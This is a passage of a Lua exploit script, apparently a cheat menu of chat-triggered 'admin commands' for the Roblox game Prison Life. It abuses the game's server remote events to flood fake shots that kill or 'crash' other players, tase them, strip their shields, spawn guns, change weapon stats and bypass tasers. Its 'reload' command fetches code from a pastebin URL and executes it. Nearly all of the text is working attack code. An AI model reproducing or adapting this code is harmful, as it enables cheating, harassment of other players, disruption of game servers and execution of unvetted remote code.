						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					}, Gun)
				end
				Gun.Parent = game.Players.LocalPlayer.Character
				game.Players.LocalPlayer.Character:FindFirstChild("AK-47"):Destroy()
			end)
		end
	end

	function CreateBeam3(Player, Distance, Position)
		if Player then
			pcall(function()
				local Backpack = game.Players.LocalPlayer.Backpack
				local Character = game.Players.LocalPlayer.Character
				local Gun = Backpack:FindFirstChild("M9") or Character:FindFirstChild("M9")
				if not Gun then
					workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
				end
				Gun = Backpack:FindFirstChild("M9") or Character:FindFirstChild("M9")
				local Head = Player.Character.Head
				if Head and Player and Character and Backpack and Gun and Distance and Position then
					game.ReplicatedStorage.ShootEvent:FireServer({
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
						{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head}
					}, Gun)
				end
				Gun.Parent = game.Players.LocalPlayer.Character
				game.Players.LocalPlayer.Character:FindFirstChild("M9"):Destroy()
			end)
		end
	end

	function Beam(Player, Distance, Time)
		if Player and Distance then
			local RunService = game:GetService("RunService")
			RunService:BindToRenderStep(Player.Name, math.huge, function()
				coroutine.wrap(function()
					CreateBeam(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
				end)()
			end)
			delay(Time, function()
				pcall(function()
					RunService:UnbindFromRenderStep(Player.Name)
				end)
			end)
		end
	end

	function LagBeam(Player, Distance, Time)
		if Player and Distance then
			local RunService = game:GetService("RunService")
			RunService:BindToRenderStep(Player.Name, math.huge, function()
				coroutine.wrap(function()
					CreateBeam(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
				end)()
				coroutine.wrap(function()
					CreateBeam2(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
				end)()
				coroutine.wrap(function()
					CreateBeam3(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
				end)()
			end)
			delay(Time, function()
				pcall(function()
					RunService:UnbindFromRenderStep(Player.Name)
				end)
			end)
		end
	end

	function DetectMove(Player)
		local oldpos = Player.Character.HumanoidRootPart.CFrame
		local Move
		local Time = 0
		repeat wait(.1)
			Time = Time + 1
			if oldpos ~= Player.Character.HumanoidRootPart.CFrame then
				Move = true
			else
				Move = false
			end
		until (Time >= 500 and Move == false) or Move == true
		return Move
	end

	function FeGodMode()
		game.Players.LocalPlayer.Character.Humanoid.Name = 1
		local l = game.Players.LocalPlayer.Character["1"]:Clone()
		l.Parent = game.Players.LocalPlayer.Character
		l.Name = "Humanoid"
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		wait()
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		game.Players.LocalPlayer.Character["1"]:Destroy()
		game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
	end

	local function GetPlayerPart(Player)
		if not Player then return end
		if Player:FindFirstChild("HumanoidRootPart") then
			return Player.HumanoidRootPart
		elseif Player:FindFirstChild("Torso") then
			return Player.Torso
		end
	end

	local Mouse = game.Players.LocalPlayer:GetMouse()

	function CopyChat(Player)
		Player.Chatted:Connect(function(Message)
			if States.CopyChat then
				Chat("["..Player.DisplayName.."]: "..Message)
			end
		end)
	end

	function Died(Player)
		pcall(function()
			if Player.Character.Humanoid.Health < 1 then
				if States.ChatNotify then
					Chat(Player.DisplayName.." Died")
				end
				if States.Notify then
					game.StarterGui:SetCore("SendNotification", {
						Title = "Game",
						Text = Player.DisplayName.." Died",
						Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
					})
				end
			end
		end)
	end

	function PlayerPickUp(Player)
		Player.Backpack.ChildAdded:Connect(function(Item)
			if States.ChatNotify then
				Chat(Player.DisplayName.." Pick Up "..Item.Name)
			end
			if States.Notify then
				game.StarterGui:SetCore("SendNotification", {
					Title = "Game",
					Text = Player.DisplayName.." Pick Up "..Item.Name,
					Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
				})
			end
		end)
	end

	local function Notify(Message, Color, Text)
		Notify6.Text = Notify5.Text
		Notify6.TextColor3 = Notify5.TextColor3
		Notify5.Text = Notify4.Text
		Notify5.TextColor3 = Notify4.TextColor3
		Notify4.Text = Notify3.Text
		Notify4.TextColor3 = Notify3.TextColor3
		Notify3.Text = Notify2.Text
		Notify3.TextColor3 = Notify2.TextColor3
		Notify2.Text = Notify1.Text
		Notify2.TextColor3 = Notify1.TextColor3
		Notify1.Text = "["..Text.."] "..Message
		Notify1.TextColor3 = Color or Color3.fromRGB(255, 255, 255)
	end

	local function Loadstring(Https)
		if not Https then return end
		loadstring(game:HttpGet((Https), true))()
	end

	local function Command(Cmd)
		return Arg1 == Prefix..Cmd
	end

	local function PrefixCommand(Cmd)
		return Arg1 == "!"..Cmd
	end

	local Walls = {
		game.Workspace.Prison_Halls.walls,
		game.Workspace.Prison_Halls.roof,
		game.Workspace.Prison_Halls.outlines,
		game.Workspace.Prison_Halls.lights,
		game.Workspace.Prison_Halls.accent,
		game.Workspace.Prison_Halls.glass,
		game.Workspace.Prison_Cellblock.b_front,
		game.Workspace.Prison_Cellblock.doors,
		game.Workspace.Prison_Cellblock.c_tables,
		game.Workspace.Prison_Cellblock.a_front,
		game.Workspace.Prison_Cellblock.b_outerwall,
		game.Workspace.Prison_Cellblock.c_wall,
		game.Workspace.Prison_Cellblock.b_wall,
		game.Workspace.Prison_Cellblock.c_hallwall,
		game.Workspace.Prison_Cellblock.a_outerwall,
		game.Workspace.Prison_Cellblock.b_ramp,
		game.Workspace.Prison_Cellblock.a_ramp,
		game.Workspace.Prison_Cellblock.a_walls,
		game.Workspace.Prison_Cellblock.Cells_B,
		game.Workspace.Prison_Cellblock.Cells_A,
		game.Workspace.Prison_Cellblock.c_corner,
		game.Workspace.Prison_Cellblock.Wedge,
		game.Workspace.Prison_Cellblock.a_ceiling,
		game.Workspace.Prison_Cellblock.b_ceiling,
		game.Workspace.City_buildings,
		game.Workspace.Prison_OuterWall,
		game.Workspace.Prison_Fences,
		game.Workspace.Prison_Guard_Outpost,
		game.Workspace.Prison_Cafeteria.building,
		game.Workspace.Prison_Cafeteria.glass,
		game.Workspace.Prison_Cafeteria.oven,
		game.Workspace.Prison_Cafeteria.shelves,
		game.Workspace.Prison_Cafeteria.vents,
		game.Workspace.Prison_Cafeteria.accents,
		game.Workspace.Prison_Cafeteria["vending machine"],
		game.Workspace.Prison_Cafeteria.Prison_table1,
		game.Workspace.Prison_Cafeteria.counter,
		game.Workspace.Prison_Cafeteria.boxes,
		game.Workspace.Prison_Cafeteria["trash bins"]
	}

--[[if not Slient then
	Chat("Admin Commands By LocalPlayer   #   7434")
	Chat("Admin Commands Version "..Versions)
	Chat("Current Prefix Is "..Prefix)
	wait()
	Chat("Admin Commands Loaded!")
else
	Chat("Loaded")
	Chat("P "..Prefix)
	Chat("V "..Versions)
end]]

	Notify("Loaded admin commands", Color3.fromRGB(0, 255, 0), "Loads")

	function PlayerChatted(Message)
		if ScriptDisabled then return end
		Split = Message:split(" ")
		Arg1 = Split[1]
		Arg2 = Split[2]
		Arg3 = Split[3]
		Arg4 = Split[4]
		if Command("unload") or Command("destroygui") then
			Notify("Unloading...", Color3.fromRGB(0, 255, 255), "Unloads")
			wait(.1)
			pcall(function()
				CmdGui:Destroy()
				States = {}
				LoopKill = {}
				LoopTase = {}
				Admin = {}
				ScriptDisabled = true
				for i,v in pairs(game.Lighting:GetChildren()) do
					v.Parent = workspace
				end
			end)
		end
		if Command("reload") or Command("update") then
			Notify("Updating versions...", Color3.fromRGB(0, 255, 255), "Updates")
			pcall(function()
				CmdGui:Destroy()
				States = {}
				LoopKill = {}
				LoopTase = {}
				Admin = {}
				ScriptDisabled = true
				for i,v in pairs(game.Lighting:GetChildren()) do
					v.Parent = workspace
				end
			end)
			Loadstring("https://pastebin.com/raw/9ab2s523")
		end
		if Command("beam") then
			local Player = GetPlayer(Arg2)
			if Player then
				Beam(Player, math.huge, 7)
				Notify("Beamed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("lagbeam") or Command("beam2") then
			local Player = GetPlayer(Arg2)
			if Player then
				LagBeam(Player, math.huge, 7)
				Notify("Lag beamed "..Player.Name, Color3.fromRGB(255, 0, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("crash") or Command("beam3") then
			local Player = GetPlayer(Arg2)
			if Player then
				LagBeam(Player, math.huge, 9000)
				Notify("Crashed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("antispamarrest") then
			States.Anti_Spam_Arrest = true
			Notify("Turn anti spam arrest on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.Anti_Spam_Arrest then
					pcall(function()
						if game.Players.LocalPlayer.Character.Head:FindFirstChild("handcuffedGui") then
							repeat wait()
								coroutine.wrap(function()
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(888, 100, 2388)
									workspace.Remote.TeamEvent:FireServer("Medium stone grey")
									workspace.Remote.TeamEvent:FireServer("Bright blue")
								end)()
							until game.Players.LocalPlayer.TeamColor.Name == "Bright blue"
							wait(.1)
							for i = 1,10 do
								workspace.Remote.TeamEvent:FireServer("Medium stone grey")
							end
						end
					end)
				end
			end
		end
		if Command("unantispamarrest") then
			States.Anti_Spam_Arrest = false
			Notify("Turn anti spam arrest off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("inmate") or Command("inmates") or Command("prisoner") or Command("prisoners") then
			workspace.Remote.TeamEvent:FireServer("Bright orange")
			Notify("Become inmate", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("guard") or Command("guards") or Command("cop") or Command("polices") or Command("cops") then
			workspace.Remote.TeamEvent:FireServer("Bright blue")
			if game.Players.LocalPlayer.TeamColor.Name == "Bright blue" then
				Notify("Become guard", Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Fulled team", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("gun") or Command("guns") or Command("allguns") then
			if BuyGamepass then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			else
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			end
			Notify("Get all guns", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("autogun") or Command("autoguns") or Command("autoallguns") then
			States.Auto_Guns = true
			Notify("Turn auto guns on", Color3.fromRGB(0, 255, 0), "Success")
			if BuyGamepass then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			else
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			end
			game.Players.LocalPlayer.CharacterAdded:Connect(function()
				if States.Auto_Guns then
					pcall(function()
						if BuyGamepass then
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
						else
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
						end
					end)
				end
			end)
		end
		if Command("unautogun") or Command("unautoguns") or Command("unautoallguns") then
			States.Auto_Guns = false
			Notify("Turn auto guns off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopgoto") or Command("loopto") then
			local Player = GetPlayer(Arg2)
			if Player then
				States.LoopGoto = true
				repeat wait()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame
				until not States.LoopGoto or not game.Players[Player.Name]
			end
		end
		if Command("unloopgoto") or Command("unloopto") then
			States.LoopGoto = false
		end
		if Command("checkscriptowner") or Command("findowner") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v.DisplayName == "Hack" and v.Name == "ih4xalots" then
					ChatNotify("Script owner : "..v.Name.." / "..v.DisplayName, Color3.fromRGB(0, 255, 0))
				end
			end
		end
		if Command("getplayer") or Command("getplayers") then
			ChatNotify("Players : "..#game.Players:GetPlayers(), Color3.fromRGB(255, 255, 255))
		end
		if Command("autofire") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				Gun["AutoFire"] = true
				Notify("Turn auto fire", Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("semifire") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				Gun["AutoFire"] = false
				Notify("Turn semi fire", Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("firespeed") or Command("setfirespeed") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				if tonumber(Arg2) ~= nil then
					Gun["FireRate"] = tonumber(Arg2)
					Notify("Set a gun fire speed to "..tonumber(Arg2), Color3.fromRGB(0, 255, 0), "Success")
				else
					Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
				end
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("burst") or Command("burstbullets") or Command("bullets") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				if tonumber(Arg2) ~= nil then
					Gun["Bullets"] = tonumber(Arg2)
					Notify("Set a gun burst bullets to "..tonumber(Arg2), Color3.fromRGB(0, 255, 0), "Success")
				else
					Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
				end
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("reloadtime") or Command("reloadtimes") then
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
				local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
				if tonumber(Arg2) ~= nil then
					Gun["ReloadTime"] = tonumber(Arg2)
					Notify("Set a gun reload time to "..tonumber(Arg2), Color3.fromRGB(0, 255, 0), "Success")
				else
					Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
				end
			else
				Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("criminal") or Command("criminals") or Command("crim") or Command("crims") or Command("crimes") or Command("crime") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Become a criminal", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("neutral") or Command("neutrals") then
			workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			Notify("Become neutral", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("red") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright red").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("blue") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Deep blue").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("black") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really black").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("pink") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Hot pink").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("grey") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Ghost grey").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("white") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("White").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("brown") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Brown").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("purple") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Royal purple").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("green") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright green").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("yellow") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright yellow").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("orange") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Neon orange").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("chatnotify") then
			States.ChatNotify = true
			Notify("Turn chat notify on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("nochatnotify") or Command("unchatnotify") then
			States.ChatNotify = false
			Notify("Turn chat notify off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("taserbypass") or Command("lock") or Command("antitaser") then
			States.TaserBypass = true
			Notify("Turn taser bypass on", Color3.fromRGB(0, 255, 0), "Success")
			game.Players.LocalPlayer.CharacterAdded:Connect(function()
				if States.TaserBypass then
					wait(.2)
					game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
					game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
					game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
				end
			end)
		end
		if Command("notaserbypass") or Command("unlock") or Command("untaserbypass") then
			States.TaserBypass = false
			Notify("Turn taser bypass off", Color3.fromRGB(0, 255, 0), "Success")
			game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = false
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
		end
		if Command("color") then
			if Arg2 ~= nil and Arg3 == nil then
				local savedcf = GetPos()
				workspace.Remote.loadchar:InvokeServer(nil, Arg2)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			elseif Arg2 ~= nil and Arg3 ~= nil and Arg4 == nil then
				local savedcf = GetPos()
				workspace.Remote.loadchar:InvokeServer(nil, Arg2.." "..Arg3)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			elseif Arg2 ~= nil and Arg3 ~= nil and Arg4 ~= nil then
				local savedcf = GetPos()
				workspace.Remote.loadchar:InvokeServer(nil, Arg2.." "..Arg3.." "..Arg4)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			end
			Notify("Changed name tag color", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("print") then
			print(Message)
			Notify("Printed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("warn") then
			warn(Message)
			Notify("Warned", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("error") then
			Notify("Printed error", Color3.fromRGB(0, 255, 0), "Success")
			error(Message)
		end
		if Command("chat") then
			Chat(Message)
			Notify("Chatted", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("copychat") then
			States.CopyChat = true
			Notify("Turn copy chat on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("uncopychat") then
			States.CopyChat = false
			Notify("Turn copy chat off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("tase") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Tase(Player)
				Notify("Tased "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("noshield") or Command("antishield") then
			States.Anti_Shield = true
			Notify("Turn anti shield users on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				for i,v in pairs(game.Players:GetPlayers()) do
					pcall(function()
						if workspace[v.Name].Torso:FindFirstChild("ShieldFolder") then
							workspace[v.Name].Torso:FindFirstChild("ShieldFolder"):Destroy()
						end
					end)
				end
			end
		end
		if Command("unantishield") then
			States.Anti_Shield = false
			Notify("Turn anti shield users off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("kill") or Command("kills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Kill(Player)
